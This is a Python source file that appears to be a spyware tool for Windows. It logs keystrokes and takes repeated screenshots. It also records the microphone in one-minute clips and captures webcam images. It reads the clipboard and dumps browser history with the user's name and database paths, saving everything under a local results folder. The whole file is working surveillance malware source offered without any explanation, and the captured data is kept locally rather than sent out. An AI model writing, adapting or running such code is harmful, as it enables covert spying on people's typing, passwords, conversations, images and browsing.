import subprocess, win32clipboard, os, cv2, time, sounddevice, logging, json, shutil
import browserhistory as bh
from scipy.io.wavfile import write as write_rec
from pynput.keyboard import Key, Listener
from PIL import ImageGrab
from threading import Thread  


def keylogger():
    logging.basicConfig(filename=('./results/key_log/' + 'key_logs.txt'), level=logging.DEBUG, format='%(asctime)s: %(message)s')

    on_press = lambda Key : logging.info(str(Key))
    with Listener(on_press=on_press) as listener:
        listener.join()


def screenshot():
    for _ in range(0, 60):
        picture = ImageGrab.grab()
        picture.save('./results/screenshots/' + 'screenshot_{}.png'.format(_))
        time.sleep(5)


def microphone():
    for _ in range(0, 5):
        fs = 44100
        seconds = 60

        recording = sounddevice.rec(int(seconds * fs), samplerate=fs, channels=2)
        sounddevice.wait()
        write_rec('./results/microphone/' + '{}_mic_recording.wav'.format(_), fs, recording)


def webcam():
    try:
        cam = cv2.VideoCapture(0)

        for _ in range(0, 60):
            ret, image = cam.read()
            file = ('./results/webcam/' + '{}.jpg'.format(_))
            cv2.imwrite(file, image)
            time.sleep(5)

        cam.release
        cv2.destroyAllWindows

    except:
        print("Web camera isn't availible")


def main():

    directories = ['./results/screenshots/', './results/key_log/', './results/microphone/', './results/webcam/']

    for i in directories:
        if os.path.exists(i):

            if os.listdir(i) is False:
                os.rmdir(i)
                print("Directory was already empty")

            else:
                shutil.rmtree(i)
                print("Deleted {} directory".format(i))
                os.mkdir(i)
                print("Created new directory")      
        
        else:
            print("Directory was not found")
    

    # Clipboard Data
    win32clipboard.OpenClipboard()
    pasted_data = win32clipboard.GetClipboardData()
    win32clipboard.CloseClipboard()

    with open('./results/key_log/' + 'clipboard_info.txt', 'a') as clipboard_info:
        clipboard_info.write('Clipboard Data: ' + pasted_data + ' \n')


    # Browser History
    browser_history = []
    bh_user = bh.get_username()
    db_path = bh.get_database_paths()
    hist = bh.get_browserhistory()
    browsers = hist.keys()
    print(browsers)
    browser_history.extend((bh_user, db_path, hist))
    with open('./results/key_log/' + 'browser.txt', 'a') as browser_txt:
        browser_txt.write(json.dumps(browser_history, indent=4, sort_keys=True))  


    t1 = Thread(target=keylogger)
    t2 = Thread(target=screenshot)
    t3 = Thread(target=microphone)
    t4 = Thread(target=webcam)

    t1.start()
    t2.start()
    t3.start()
    t4.start()

    t1.join(timeout=300)
    t2.join(timeout=300)
    t3.join(timeout=300)
    t4.join(timeout=300)


if __name__ == '__main__':
    main()
